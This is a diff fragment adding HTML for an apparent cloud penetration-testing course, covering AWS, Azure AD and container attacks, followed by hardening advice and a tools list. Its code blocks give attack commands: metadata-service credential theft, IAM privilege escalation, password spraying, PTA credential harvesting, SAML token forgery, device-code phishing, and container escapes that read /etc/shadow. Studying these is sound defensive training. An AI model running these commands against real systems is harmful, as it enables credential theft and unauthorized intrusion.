+curl -H "Metadata: true" "http://169.254.169.254/metadata/instance?api-version=2021-02-01"
+
+# Azure access token retrieval
+curl -H "Metadata: true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"</div>
+                </div>
+
+                <button class="btn btn-primary" onclick="showSection('aws-hacking')">Next: AWS Hacking →</button>
+            </div>
+
+            <!-- AWS Hacking Section -->
+            <div id="aws-hacking" class="module-section">
+                <h2 class="section-title">🚀 AWS Hacking Techniques</h2>
+
+                <div class="card">
+                    <h3>📊 S3 Bucket Exploitation</h3>
+                    <p>Amazon S3 buckets are frequently misconfigured, making them prime targets for data exposure and unauthorized access.</p>
+
+                    <h4>🔍 S3 Bucket Enumeration:</h4>
+                    <div class="code-block"># Basic S3 bucket enumeration
+aws s3 ls s3://target-bucket --no-sign-request
+
+# List all buckets (requires credentials)
+aws s3 ls
+
+# Recursive listing with file sizes
+aws s3 ls s3://target-bucket --recursive --human-readable
+
+# Check bucket permissions
+aws s3api get-bucket-acl --bucket target-bucket --no-sign-request</div>
+
+                    <div class="warning-box">
+                        <h4>⚠️ Common S3 Misconfigurations:</h4>
+                        <ul>
+                            <li><strong>Public Read Access:</strong> Anyone can list and download objects</li>
+                            <li><strong>Public Write Access:</strong> Anyone can upload files to the bucket</li>
+                            <li><strong>Authenticated Users:</strong> All AWS users can access</li>
+                            <li><strong>Public Read ACP:</strong> Anyone can read access control policies</li>
+                            <li><strong>Public Write ACP:</strong> Anyone can modify access control policies</li>
+                        </ul>
+                    </div>
+                </div>
+
+                <div class="card">
+                    <h3>🛠️ Advanced S3 Exploitation Techniques</h3>
+                    
+                    <h4>1. Bucket Takeover via DNS:</h4>
+                    <div class="code-block"># Check for dangling DNS records
+dig target.s3.amazonaws.com
+dig target.s3-website-us-east-1.amazonaws.com
+
+# Create bucket with same name
+aws s3 mb s3://target --region us-east-1</div>
+
+                    <h4>2. ACL Manipulation:</h4>
+                    <div class="code-block"># Read current ACL
+aws s3api get-bucket-acl --bucket target-bucket
+
+# Grant public read access
+aws s3api put-bucket-acl --bucket target-bucket --acl public-read
+
+# Grant full control to authenticated users
+aws s3api put-bucket-acl --bucket target-bucket --acl authenticated-read</div>
+
+                    <h4>3. Server-Side Encryption Bypass:</h4>
+                    <div class="code-block"># Check encryption configuration
+aws s3api get-bucket-encryption --bucket target-bucket
+
+# Upload unencrypted file (if misconfigured)
+aws s3 cp malicious.txt s3://target-bucket/ --storage-class STANDARD</div>
+                </div>
+
+                <div class="card">
+                    <h3>🔐 IAM Privilege Escalation</h3>
+                    <p>Exploiting misconfigurations in AWS Identity and Access Management (IAM) to gain elevated privileges.</p>
+
+                    <h4>Common IAM Attack Vectors:</h4>
+                    <div class="grid">
+                        <div class="attack-vector">
+                            <strong>1. iam:CreateRole + iam:AttachRolePolicy</strong>
+                            <p>Create new role and attach admin policy</p>
+                        </div>
+                        <div class="attack-vector">
+                            <strong>2. iam:AddUserToGroup</strong>
+                            <p>Add user to privileged groups</p>
+                        </div>
+                        <div class="attack-vector">
+                            <strong>3. iam:AttachUserPolicy</strong>
+                            <p>Directly attach admin policies to users</p>
+                        </div>
+                        <div class="attack-vector">
+                            <strong>4. sts:AssumeRole</strong>
+                            <p>Assume roles with higher privileges</p>
+                        </div>
+                    </div>
+
+                    <h4>Privilege Escalation Examples:</h4>
+                    <div class="code-block"># List current user permissions
+aws iam get-user
+aws iam list-attached-user-policies --user-name target-user
+
+# Create new admin role
+aws iam create-role --role-name AdminRole --assume-role-policy-document file://trust-policy.json
+
+# Attach admin policy
+aws iam attach-role-policy --role-name AdminRole --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
+
+# Assume the new role
+aws sts assume-role --role-arn arn:aws:iam::123456789012:role/AdminRole --role-session-name AttackSession</div>
+                </div>
+
+                <div class="card">
+                    <h3>🔍 EC2 Instance Exploitation</h3>
+                    
+                    <h4>Instance Metadata Service (IMDS) Attacks:</h4>
+                    <div class="code-block"># Check for IMDS access (SSRF payload)
+curl http://169.254.169.254/latest/meta-data/
+
+# Retrieve IAM role credentials
+curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
+curl http://169.254.169.254/latest/meta-data/iam/security-credentials/role-name
+
+# Get instance identity document
+curl http://169.254.169.254/latest/dynamic/instance-identity/document</div>
+
+                    <h4>User Data Exploitation:</h4>
+                    <div class="code-block"># Retrieve instance user data (may contain secrets)
+curl http://169.254.169.254/latest/user-data
+
+# Common user data locations for secrets:
+# - Database passwords
+# - API keys
+# - Service credentials
+# - Configuration files</div>
+
+                    <div class="danger-box">
+                        <h4>🚨 SSRF to IMDS Attack Chain:</h4>
+                        <p><strong>Scenario:</strong> Web application vulnerable to Server-Side Request Forgery (SSRF)</p>
+                        <ol>
+                            <li>Identify SSRF vulnerability in target application</li>
+                            <li>Use SSRF to access IMDS endpoint (169.254.169.254)</li>
+                            <li>Enumerate available IAM roles and credentials</li>
+                            <li>Extract temporary AWS credentials</li>
+                            <li>Use credentials for lateral movement and privilege escalation</li>
+                        </ol>
+                    </div>
+                </div>
+
+                <div class="card">
+                    <h3>💾 RDS and Database Exploitation</h3>
+                    
+                    <h4>RDS Instance Enumeration:</h4>
+                    <div class="code-block"># List RDS instances
+aws rds describe-db-instances
+
+# Check for public accessibility
+aws rds describe-db-instances --query 'DBInstances[?PubliclyAccessible==`true`]'
+
+# List database snapshots
+aws rds describe-db-snapshots --snapshot-type public</div>
+
+                    <h4>Common Database Attack Vectors:</h4>
+                    <ul>
+                        <li><strong>🌐 Publicly Accessible Databases:</strong> Direct internet access</li>
+                        <li><strong>🔓 Default Credentials:</strong> Weak or unchanged passwords</li>
+                        <li><strong>📷 Public Snapshots:</strong> Exposed database backups</li>
+                        <li><strong>🔍 Security Group Misconfigurations:</strong> Overly permissive rules</li>
+                        <li><strong>📜 Unencrypted Storage:</strong> Data readable from snapshots</li>
+                    </ul>
+                </div>
+
+                <button class="btn btn-primary" onclick="showSection('azure-hacking')">Next: Azure Hacking →</button>
+            </div>
+
+            <!-- Azure Hacking Section -->
+            <div id="azure-hacking" class="module-section">
+                <h2 class="section-title">🔷 Azure Active Directory Hacking</h2>
+
+                <div class="card">
+                    <h3>🔍 Azure AD Reconnaissance</h3>
+                    <p>Azure Active Directory (Azure AD) reconnaissance involves gathering information about an organization's cloud identity infrastructure.</p>
+
+                    <h4>AADInternals - The Azure AD Swiss Army Knife:</h4>
+                    <div class="tool-card">
+                        <h4>📦 AADInternals PowerShell Module</h4>
+                        <p><strong>Description:</strong> Comprehensive toolkit for Azure AD security research and penetration testing</p>
+                        <p><strong>Capabilities:</strong> User enumeration, token manipulation, authentication bypass, persistence</p>
+                    </div>
+                </div>
+
+                <div class="card">
+                    <h3>👥 User Enumeration Techniques</h3>
+                    
+                    <h4>Outsider User Enumeration:</h4>
+                    <div class="code-block"># Install AADInternals
+Install-Module AADInternals
+
+# Get tenant information
+Get-AADIntTenantID -Domain target.com
+Invoke-AADIntReconAsOutsider -DomainName target.com
+
+# Enumerate users as outsider
+Invoke-AADIntUserEnumerationAsOutsider -UserName "admin@target.com"
+
+# Bulk user enumeration
+Get-Content users.txt | Invoke-AADIntUserEnumerationAsOutsider -Method Normal</div>
+
+                    <div class="highlight-box">
+                        <h4>🎯 User Enumeration Methods:</h4>
+                        <ul>
+                            <li><strong>Normal:</strong> Uses login endpoint for validation</li>
+                            <li><strong>Login:</strong> Attempts actual login (more detectable)</li>
+                            <li><strong>Autologon:</strong> Uses autologon endpoint</li>
+                        </ul>
+                    </div>
+
+                    <h4>Expected Results:</h4>
+                    <div class="code-block">UserName                     Exists
+--------                     ------
+admin@target.com             True
+user@target.com              True
+nonexistent@target.com       False</div>
+                </div>
+
+                <div class="card">
+                    <h3>🔓 Authentication Bypass Techniques</h3>
+                    
+                    <h4>Password Spray Attacks:</h4>
+                    <div class="code-block"># Perform password spraying
+Invoke-AADIntPasswordSprayAsOutsider -DomainName target.com -Passwords @("Password123","Winter2024","Company123")
+
+# Use common passwords list
+$passwords = Get-Content "common-passwords.txt"
+Invoke-AADIntPasswordSprayAsOutsider -DomainName target.com -Passwords $passwords</div>
+
+                    <div class="warning-box">
+                        <h4>⚠️ Password Spray Best Practices:</h4>
+                        <ul>
+                            <li>Use low and slow approach to avoid lockouts</li>
+                            <li>Respect account lockout policies</li>
+                            <li>Focus on common passwords and seasonal variations</li>
+                            <li>Monitor for defensive responses</li>
+                        </ul>
+                    </div>
+                </div>
+
+                <div class="card">
+                    <h3>🎭 Pass-Through Authentication (PTA) Attacks</h3>
+                    <p>Advanced persistence technique targeting Azure AD Pass-Through Authentication agents.</p>
+
+                    <h4>PTA Spy Attack (PTASpy):</h4>
+                    <div class="code-block"># Export PTA agent certificate (requires admin access)
+Export-AADIntProxyAgentCertificates
+
+# Install PTA Spy on compromised server
+Install-AADIntPTASpy
+
+# Start credential harvesting
+# All authentication attempts will be intercepted and logged</div>
+
+                    <div class="danger-box">
+                        <h4>🚨 PTA Attack Impact:</h4>
+                        <ul>
+                            <li><strong>Credential Harvesting:</strong> Capture plaintext passwords</li>
+                            <li><strong>Persistent Access:</strong> Maintain backdoor access</li>
+                            <li><strong>Stealth Operation:</strong> Difficult to detect</li>
+                            <li><strong>MFA Bypass:</strong> Intercept authentication before MFA</li>
+                        </ul>
+                    </div>
+                </div>
+
+                <div class="card">
+                    <h3>🔑 Token Manipulation and Forgery</h3>
+                    
+                    <h4>Security Token Crafting:</h4>
+                    <div class="code-block"># Get required information for token crafting
+Get-AADIntDomainInfo -Domain target.com
+
+# Export ADFS certificates (if federated)
+Export-AADIntADFSCertificates
+
+# Create forged security token
+New-AADIntSAMLToken -UserPrincipalName "admin@target.com" -IssuerURI "http://target.com/adfs/services/trust"</div>
+
+                    <h4>Device Registration Abuse:</h4>
+                    <div class="code-block"># Register rogue device
+Join-AADIntDeviceToAzureAD -DeviceName "AttackerDevice" -OSName "Windows 10"
+
+# Create Bulk PRT (BPRT) for persistence
+# Note: Can be used for DoS attacks against Azure AD</div>
+                </div>
+
+                <div class="card">
+                    <h3>☁️ Azure Resource Enumeration</h3>
+                    
+                    <h4>Azure REST API Reconnaissance:</h4>
+                    <div class="code-block"># Get Azure access token
+$token = Get-AADIntAccessTokenForAzureMgmt
+
+# Enumerate subscriptions
+Get-AADIntAzureSubscriptions -AccessToken $token
+
+# List virtual machines
+Get-AADIntAzureVMs -SubscriptionId "subscription-id" -AccessToken $token
+
+# Enumerate storage accounts
+Get-AADIntAzureStorageAccounts -AccessToken $token</div>
+
+                    <h4>Azure Blob Storage Enumeration:</h4>
+                    <div class="code-block"># Common Azure blob naming patterns
+https://company.blob.core.windows.net
+https://companybackup.blob.core.windows.net
+https://company-prod.blob.core.windows.net
+https://company-dev.blob.core.windows.net
+
+# Check for public blob containers
+curl https://company.blob.core.windows.net/?comp=list</div>
+                </div>
+
+                <div class="card">
+                    <h3>📱 Modern Authentication Bypass</h3>
+                    
+                    <h4>Device Code Phishing:</h4>
+                    <div class="code-block"># Initiate device code authentication flow
+Get-AADIntUserPRTToken -UserName "target@company.com"
+
+# Social engineering: Send device code to target
+# "Please visit https://microsoft.com/devicelogin and enter code: ABC123"</div>
+
+                    <div class="warning-box">
+                        <h4>⚠️ Device Code Attack Vector:</h4>
+                        <p><strong>Attack Flow:</strong></p>
+                        <ol>
+                            <li>Attacker initiates device code authentication</li>
+                            <li>Azure AD provides device code and user code</li>
+                            <li>Attacker tricks user into entering code</li>
+                            <li>User authenticates on their device</li>
+                            <li>Attacker receives access token</li>
+                        </ol>
+                    </div>
+                </div>
+
+                <button class="btn btn-primary" onclick="showSection('container-security')">Next: Container Security →</button>
+            </div>
+
+            <!-- Container Security Section -->
+            <div id="container-security" class="module-section">
+                <h2 class="section-title">🐳 Container Security & Exploitation</h2>
+
+                <div class="card">
+                    <h3>📦 Container Technology Overview</h3>
+                    <p>Containers have revolutionized application deployment but introduce unique security challenges that ethical hackers must understand.</p>
+
+                    <div class="grid">
+                        <div style="background: var(--gradient-primary); color: white; padding: 20px; border-radius: 10px;">
+                            <h4>🐳 Docker Containers</h4>
+                            <ul>
+                                <li>Application containerization platform</li>
+                                <li>Container images and registries</li>
+                                <li>Docker daemon and API</li>
+                                <li>Container runtime security</li>
+                            </ul>
+                        </div>
+
+                        <div style="background: var(--gradient-success); color: white; padding: 20px; border-radius: 10px;">
+                            <h4>☸️ Kubernetes Orchestration</h4>
+                            <ul>
+                                <li>Container orchestration platform</li>
+                                <li>Pod and cluster management</li>
+                                <li>Service mesh and networking</li>
+                                <li>RBAC and security policies</li>
+                            </ul>
+                        </div>
+
+                        <div style="background: var(--gradient-warning); color: white; padding: 20px; border-radius: 10px;">
+                            <h4>🏗️ Container Registries</h4>
+                            <ul>
+                                <li>Docker Hub, ECR, ACR, GCR</li>
+                                <li>Image vulnerability scanning</li>
+                                <li>Access control and authentication</li>
+                                <li>Image signing and trust</li>
+                            </ul>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="card">
+                    <h3>🔍 Container Vulnerability Assessment</h3>
+                    
+                    <h4>Image Vulnerability Scanning with Trivy:</h4>
+                    <div class="code-block"># Install Trivy scanner
+apt-get install trivy
+
+# Scan Docker image for vulnerabilities
+trivy image nginx:1.19.6
+
+# Scan with specific severity levels
+trivy image --severity HIGH,CRITICAL nginx:1.19.6
+
+# Output in JSON format
+trivy image --format json nginx:1.19.6 > scan-results.json</div>
+
+                    <div class="highlight-box">
+                        <h4>🎯 Common Container Vulnerabilities:</h4>
+                        <ul>
+                            <li><strong>Base Image Vulnerabilities:</strong> Outdated OS packages and libraries</li>
+                            <li><strong>Privilege Escalation:</strong> Running containers as root</li>
+                            <li><strong>Resource Limits:</strong> Lack of CPU/memory constraints</li>
+                            <li><strong>Network Exposure:</strong> Unnecessary port mappings</li>
+                            <li><strong>Secret Management:</strong> Hardcoded credentials in images</li>
+                        </ul>
+                    </div>
+                </div>
+
+                <div class="card">
+                    <h3>🚨 Docker Security Exploitation</h3>
+                    
+                    <h4>Docker Daemon API Exploitation:</h4>
+                    <div class="code-block"># Check for exposed Docker daemon
+nmap -p 2375,2376 target-host
+
+# Connect to insecure Docker daemon
+export DOCKER_HOST=tcp://target-host:2375
+
+# List containers and images
+docker ps -a
+docker images
+
+# Create privileged container for host escape
+docker run -it --privileged --pid=host --net=host --volume /:/host alpine chroot /host bash</div>
+
+                    <h4>Container Escape Techniques:</h4>
+                    <div class="danger-box">
+                        <h4>🚨 Privileged Container Escape:</h4>
+                        <div class="code-block"># Check if running in privileged mode
+cat /proc/1/cgroup | grep docker
+
+# Mount host filesystem
+mkdir /tmp/host
+mount /dev/sda1 /tmp/host
+
+# Access host files
+ls /tmp/host
+cat /tmp/host/etc/shadow</div>
+                    </div>
+
+                    <h4>Docker Socket Exploitation:</h4>
+                    <div class="code-block"># Check for Docker socket access
+ls -la /var/run/docker.sock
+
+# Use Docker socket to create privileged container
+docker -H unix:///var/run/docker.sock run -it --privileged --pid=host --net=host --volume /:/host alpine</div>
+                </div>
+
+                <div class="card">
+                    <h3>☸️ Kubernetes Security Assessment</h3>
+                    
+                    <h4>Kubernetes API Server Reconnaissance:</h4>
+                    <div class="code-block"># Check for exposed Kubernetes API
+nmap -p 8080,8443,10250,10255 target-cluster
+
+# Access insecure API server
+curl http://target-cluster:8080/api/v1/namespaces
+
+# Check kubelet API
+curl http://target-node:10255/pods</div>
+
+                    <h4>Pod Security Assessment:</h4>
+                    <div class="code-block"># Check current pod security context
+kubectl auth can-i --list
+
+# Look for privileged pods
+kubectl get pods --all-namespaces -o jsonpath='{range .items[*]}{.metadata.name}{"\t"}{.spec.securityContext.privileged}{"\n"}{end}'
+
+# Check for dangerous capabilities
+kubectl get pods -o jsonpath='{range .items[*]}{.metadata.name}{"\t"}{.spec.containers[*].securityContext.capabilities.add}{"\n"}{end}'</div>
+
+                    <div class="warning-box">
+                        <h4>⚠️ Kubernetes Attack Vectors:</h4>
+                        <ul>
+                            <li><strong>🔓 Insecure API Server:</strong> Unauthenticated access to cluster API</li>
+                            <li><strong>🏃‍♂️ Privileged Pods:</strong> Containers with host-level access</li>
+                            <li><strong>🌐 NodePort Services:</strong> Direct access to cluster nodes</li>
+                            <li><strong>📂 Host Path Mounts:</strong> Access to host filesystem</li>
+                            <li><strong>🔑 Service Account Tokens:</strong> Overprivileged service accounts</li>
+                        </ul>
+                    </div>
+                </div>
+
+                <div class="card">
+                    <h3>🏭 Container Registry Attacks</h3>
+                    
+                    <h4>Registry Enumeration:</h4>
+                    <div class="code-block"># Docker Hub enumeration
+curl https://registry-1.docker.io/v2/_catalog
+
+# Check for public repositories
+curl https://registry-1.docker.io/v2/company/app/tags/list
+
+# AWS ECR enumeration
+aws ecr describe-repositories --region us-west-2
+
+# Azure ACR enumeration
+az acr repository list --name company-registry</div>
+
+                    <h4>Image Analysis and Secret Extraction:</h4>
+                    <div class="code-block"># Download and analyze Docker image
+docker pull target/vulnerable-app:latest
+docker history target/vulnerable-app:latest
+
+# Extract filesystem layers
+docker save target/vulnerable-app:latest -o app.tar
+tar -xvf app.tar
+
+# Search for secrets in layers
+grep -r "password\|key\|token" .
+find . -name "*.env" -o -name "config.json" -o -name "*.key"</div>
+                </div>
+
+                <div class="card">
+                    <h3>🔬 Advanced Container Exploitation</h3>
+                    
+                    <h4>Supply Chain Attacks:</h4>
+                    <div class="attack-vector">
+                        <strong>1. Malicious Base Images</strong>
+                        <p>Compromise popular base images with backdoors or malware</p>
+                    </div>
+                    <div class="attack-vector">
+                        <strong>2. Dependency Confusion</strong>
+                        <p>Upload malicious packages with similar names to legitimate dependencies</p>
+                    </div>
+                    <div class="attack-vector">
+                        <strong>3. Registry Poisoning</strong>
+                        <p>Replace legitimate images with malicious versions</p>
+                    </div>
+
+                    <h4>Runtime Security Bypass:</h4>
+                    <div class="code-block"># Check security policies
+kubectl get psp,networkpolicies,podsecuritypolicies
+
+# Attempt privilege escalation via init containers
+kubectl apply -f malicious-pod.yaml
+
+# Use hostPID for process manipulation
+docker run --pid=host -it alpine ps aux</div>
+                </div>
+
+                <button class="btn btn-primary" onclick="showSection('countermeasures')">Next: Countermeasures →</button>
+            </div>
+
+            <!-- Countermeasures Section -->
+            <div id="countermeasures" class="module-section">
+                <h2 class="section-title">🛡️ Cloud Security Countermeasures</h2>
+
+                <div class="card">
+                    <h3>🏗️ Cloud Security Architecture</h3>
+                    <p>Implementing a comprehensive cloud security strategy requires multiple layers of defense and proper security controls.</p>
+
+                    <div class="grid">
+                        <div style="background: var(--gradient-primary); color: white; padding: 20px; border-radius: 10px;">
+                            <h4>🔐 Identity & Access Management</h4>
+                            <ul>
+                                <li>Multi-factor authentication (MFA)</li>
+                                <li>Privileged access management (PAM)</li>
+                                <li>Role-based access control (RBAC)</li>
+                                <li>Just-in-time (JIT) access</li>
+                            </ul>
+                        </div>
+
+                        <div style="background: var(--gradient-success); color: white; padding: 20px; border-radius: 10px;">
+                            <h4>🔍 Monitoring & Logging</h4>
+                            <ul>
+                                <li>Cloud security information and event management (SIEM)</li>
+                                <li>User and entity behavior analytics (UEBA)</li>
+                                <li>API activity monitoring</li>
+                                <li>Anomaly detection and alerting</li>
+                            </ul>
+                        </div>
+
+                        <div style="background: var(--gradient-warning); color: white; padding: 20px; border-radius: 10px;">
+                            <h4>🔒 Data Protection</h4>
+                            <ul>
+                                <li>Encryption at rest and in transit</li>
+                                <li>Data loss prevention (DLP)</li>
+                                <li>Data classification and tagging</li>
+                                <li>Backup and disaster recovery</li>
+                            </ul>
+                        </div>
+
+                        <div style="background: var(--gradient-danger); color: white; padding: 20px; border-radius: 10px;">
+                            <h4>🌐 Network Security</h4>
+                            <ul>
+                                <li>Virtual private clouds (VPC)</li>
+                                <li>Network segmentation and microsegmentation</li>
+                                <li>Web application firewalls (WAF)</li>
+                                <li>DDoS protection services</li>
+                            </ul>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="card">
+                    <h3>🔧 AWS Security Best Practices</h3>
+                    
+                    <h4>S3 Bucket Security:</h4>
+                    <div class="code-block"># Block public access at account level
+aws s3control put-public-access-block --account-id 123456789012 --public-access-block-configuration BlockPublicAcls=true,IgnorePublicAcls=true,BlockPublicPolicy=true,RestrictPublicBuckets=true
+
+# Enable server-side encryption
+aws s3api put-bucket-encryption --bucket my-bucket --server-side-encryption-configuration file://encryption.json
+
+# Enable versioning and MFA delete
+aws s3api put-bucket-versioning --bucket my-bucket --versioning-configuration Status=Enabled,MFADelete=Enabled</div>
+
+                    <h4>IAM Security Configuration:</h4>
+                    <div class="code-block"># Enable MFA for root account
+aws iam create-virtual-mfa-device --virtual-mfa-device-name root-mfa
+
+# Create least privilege policies
+{
+  "Version": "2012-10-17",
+  "Statement": [
+    {
+      "Effect": "Allow",
+      "Action": [
+        "s3:GetObject"
+      ],
+      "Resource": "arn:aws:s3:::my-bucket/*",
+      "Condition": {
+        "IpAddress": {
+          "aws:SourceIp": "203.0.113.0/24"
+        }
+      }
+    }
+  ]
+}</div>
+
+                    <div class="highlight-box">
+                        <h4>🎯 AWS Security Controls:</h4>
+                        <ul>
+                            <li><strong>CloudTrail:</strong> API call logging and monitoring</li>
+                            <li><strong>GuardDuty:</strong> Threat detection service</li>
+                            <li><strong>Security Hub:</strong> Centralized security findings</li>
+                            <li><strong>Config:</strong> Resource configuration compliance</li>
+                            <li><strong>Inspector:</strong> Application security assessment</li>
+                        </ul>
+                    </div>
+                </div>
+
+                <div class="card">
+                    <h3>🔷 Azure Security Recommendations</h3>
+                    
+                    <h4>Azure AD Security Hardening:</h4>
+                    <div class="code-block"># Enable conditional access policies
+New-AzureADMSConditionalAccessPolicy -DisplayName "Require MFA for Admins" -State Enabled
+
+# Configure privileged identity management
+Enable-AzureADMSPrivilegedRoleManagement
+
+# Set up Azure AD Identity Protection
+New-AzureADMSRiskDetectionPolicy -DisplayName "High Risk Users" -RiskLevel High</div>
+
+                    <h4>Azure Storage Security:</h4>
+                    <div class="code-block"># Enable storage account encryption
+Set-AzStorageAccount -ResourceGroupName "myResourceGroup" -AccountName "mystorageaccount" -EnableHttpsTrafficOnly $true
+
+# Configure network access rules
+Add-AzStorageAccountNetworkRule -ResourceGroupName "myResourceGroup" -AccountName "mystorageaccount" -IPAddressOrRange "203.0.113.0/24"
+
+# Enable Azure Defender for Storage
+Set-AzSecurityPricing -Name "StorageAccounts" -PricingTier "Standard"</div>
+
+                    <div class="warning-box">
+                        <h4>⚠️ Azure Security Features:</h4>
+                        <ul>
+                            <li><strong>Azure Security Center:</strong> Cloud security posture management</li>
+                            <li><strong>Azure Sentinel:</strong> Cloud-native SIEM solution</li>
+                            <li><strong>Azure Key Vault:</strong> Secrets and key management</li>
+                            <li><strong>Azure Policy:</strong> Governance and compliance</li>
+                            <li><strong>Azure Firewall:</strong> Network security service</li>
+                        </ul>
+                    </div>
+                </div>
+
+                <div class="card">
+                    <h3>🐳 Container Security Best Practices</h3>
+                    
+                    <h4>Docker Security Hardening:</h4>
+                    <div class="code-block"># Use non-root user in Dockerfile
+FROM alpine:3.14
+RUN addgroup -g 1000 appgroup && adduser -u 1000 -G appgroup -s /bin/sh -D appuser
+USER appuser
+
+# Remove unnecessary capabilities
+docker run --cap-drop=ALL --cap-add=NET_BIND_SERVICE myapp
+
+# Use read-only filesystem
+docker run --read-only --tmpfs /var/run --tmpfs /var/lock myapp
+
+# Limit resources
+docker run --memory=512m --cpus=1.0 --pids-limit=100 myapp</div>
+
+                    <h4>Kubernetes Security Configuration:</h4>
+                    <div class="code-block"># Pod Security Policy
+apiVersion: policy/v1beta1
+kind: PodSecurityPolicy
+metadata:
+  name: restricted
+spec:
+  privileged: false
+  allowPrivilegeEscalation: false
+  requiredDropCapabilities:
+    - ALL
+  runAsUser:
+    rule: 'MustRunAsNonRoot'
+  seLinux:
+    rule: 'RunAsAny'
+  fsGroup:
+    rule: 'RunAsAny'</div>
+
+                    <h4>Image Security Scanning:</h4>
+                    <div class="code-block"># Integrate Trivy into CI/CD pipeline
+trivy image --exit-code 1 --severity HIGH,CRITICAL myapp:latest
+
+# Use admission controllers
+kubectl apply -f https://raw.githubusercontent.com/open-policy-agent/gatekeeper/release-3.8/deploy/gatekeeper.yaml
+
+# Implement network policies
+apiVersion: networking.k8s.io/v1
+kind: NetworkPolicy
+metadata:
+  name: deny-all
+spec:
+  podSelector: {}
+  policyTypes:
+  - Ingress
+  - Egress</div>
+                </div>
+
+                <div class="card">
+                    <h3>🔍 Continuous Security Monitoring</h3>
+                    
+                    <h4>Security Automation and Orchestration:</h4>
+                    <div class="grid">
+                        <div class="attack-vector">
+                            <strong>🤖 Automated Threat Response</strong>
+                            <p>Use SOAR platforms to automatically respond to security incidents</p>
+                        </div>
+                        <div class="attack-vector">
+                            <strong>📊 Security Metrics and KPIs</strong>
+                            <p>Track security posture with measurable indicators</p>
+                        </div>
+                        <div class="attack-vector">
+                            <strong>🔄 Continuous Compliance</strong>
+                            <p>Implement continuous compliance monitoring and reporting</p>
+                        </div>
+                        <div class="attack-vector">
+                            <strong>🎯 Threat Hunting</strong>
+                            <p>Proactive threat hunting in cloud environments</p>
+                        </div>
+                    </div>
+
+                    <h4>Cloud Security Frameworks:</h4>
+                    <ul>
+                        <li><strong>🏛️ NIST Cybersecurity Framework:</strong> Comprehensive security guidelines</li>
+                        <li><strong>☁️ Cloud Security Alliance (CSA):</strong> Cloud-specific security controls</li>
+                        <li><strong>🛡️ CIS Controls:</strong> Critical security controls implementation</li>
+                        <li><strong>🔒 ISO 27001/27017:</strong> Information security management for cloud</li>
+                        <li><strong>⚖️ SOC 2:</strong> Service organization controls for cloud providers</li>
+                    </ul>
+                </div>
+
+                <button class="btn btn-primary" onclick="showSection('tools')">Next: Security Tools →</button>
+            </div>
+
+            <!-- Tools Section -->
+            <div id="tools" class="module-section">
+                <h2 class="section-title">🔧 Cloud Security Tools</h2>
+
+                <div class="card">
+                    <h3>🔍 Reconnaissance and Enumeration Tools</h3>
+                    
+                    <div class="grid">
+                        <div class="tool-card">
+                            <h4>☁️ cloud_enum</h4>
+                            <p><strong>Purpose:</strong> Multi-cloud enumeration tool</p>
+                            <p><strong>Targets:</strong> AWS, Azure, GCP storage buckets and services</p>
+                            <p><strong>Usage:</strong> python3 cloud_enum.py -k company -l company.txt</p>
+                        </div>
+
+                        <div class="tool-card">
+                            <h4>🔷 AADInternals</h4>
+                            <p><strong>Purpose:</strong> Azure AD security research toolkit</p>
+                            <p><strong>Features:</strong> User enumeration, token manipulation, authentication bypass</p>
+                            <p><strong>Usage:</strong> PowerShell module for comprehensive Azure AD testing</p>
+                        </div>
+
+                        <div class="tool-card">
+                            <h4>🚀 AWS CLI</h4>
+                            <p><strong>Purpose:</strong> Official AWS command-line interface</p>
+                            <p><strong>Features:</strong> Service enumeration, resource management, credential testing</p>
+                            <p><strong>Usage:</strong> aws s3 ls --no-sign-request</p>
+                        </div>
+
+                        <div class="tool-card">
+                            <h4>🗺️ CloudMapper</h4>
+                            <p><strong>Purpose:</strong> AWS account reconnaissance and visualization</p>
+                            <p><strong>Features:</strong> Network topology mapping, security analysis</p>
+                            <p><strong>Usage:</strong> python3 cloudmapper.py collect --account-name target</p>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="card">
+                    <h3>🛡️ Vulnerability Assessment Tools</h3>
+                    
+                    <div class="grid">
+                        <div class="tool-card">
+                            <h4>🔬 Trivy</h4>
+                            <p><strong>Purpose:</strong> Container image vulnerability scanner</p>
+                            <p><strong>Features:</strong> OS package and application dependency scanning</p>
+                            <p><strong>Usage:</strong> trivy image --severity HIGH,CRITICAL nginx:1.19.6</p>
+                        </div>
+
+                        <div class="tool-card">
+                            <h4>🔍 Scout Suite</h4>
+                            <p><strong>Purpose:</strong> Multi-cloud security auditing tool</p>
+                            <p><strong>Features:</strong> AWS, Azure, GCP configuration assessment</p>
+                            <p><strong>Usage:</strong> python3 scout.py aws --access-key-id KEY</p>
+                        </div>
+
+                        <div class="tool-card">
+                            <h4>⚡ Nuclei</h4>
+                            <p><strong>Purpose:</strong> Template-based vulnerability scanner</p>
+                            <p><strong>Features:</strong> Cloud service discovery and vulnerability detection</p>
+                            <p><strong>Usage:</strong> nuclei -t cloud/ -l targets.txt</p>
+                        </div>
+
+                        <div class="tool-card">
+                            <h4>🏗️ Terrascan</h4>
+                            <p><strong>Purpose:</strong> Infrastructure as Code security scanner</p>
+                            <p><strong>Features:</strong> Terraform, CloudFormation, Kubernetes scanning</p>
+                            <p><strong>Usage:</strong> terrascan scan -i terraform -d .</p>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="card">
+                    <h3>🎯 Exploitation and Penetration Testing Tools</h3>
+                    
+                    <div class="grid">
+                        <div class="tool-card">
+                            <h4>🪣 S3Scanner</h4>
+                            <p><strong>Purpose:</strong> S3 bucket security testing</p>
+                            <p><strong>Features:</strong> Permission testing, content enumeration</p>
+                            <p><strong>Usage:</strong> python3 s3scanner.py -l buckets.txt</p>
+                        </div>
+
+                        <div class="tool-card">
+                            <h4>☁️ Pacu</h4>
+                            <p><strong>Purpose:</strong> AWS exploitation framework</p>
+                            <p><strong>Features:</strong> Modular attack platform for AWS environments</p>
+                            <p><strong>Usage:</strong> Modular exploitation with 30+ attack modules</p>
+                        </div>
+
+                        <div class="tool-card">
+                            <h4>🔵 PowerZure</h4>
+                            <p><strong>Purpose:</strong> Azure exploitation toolkit</p>
+                            <p><strong>Features:</strong> Azure AD and resource exploitation</p>
+                            <p><strong>Usage:</strong> PowerShell module for Azure attack scenarios</p>
+                        </div>
+
+                        <div class="tool-card">
+                            <h4>⚡ kubectl</h4>
+                            <p><strong>Purpose:</strong> Kubernetes cluster management</p>
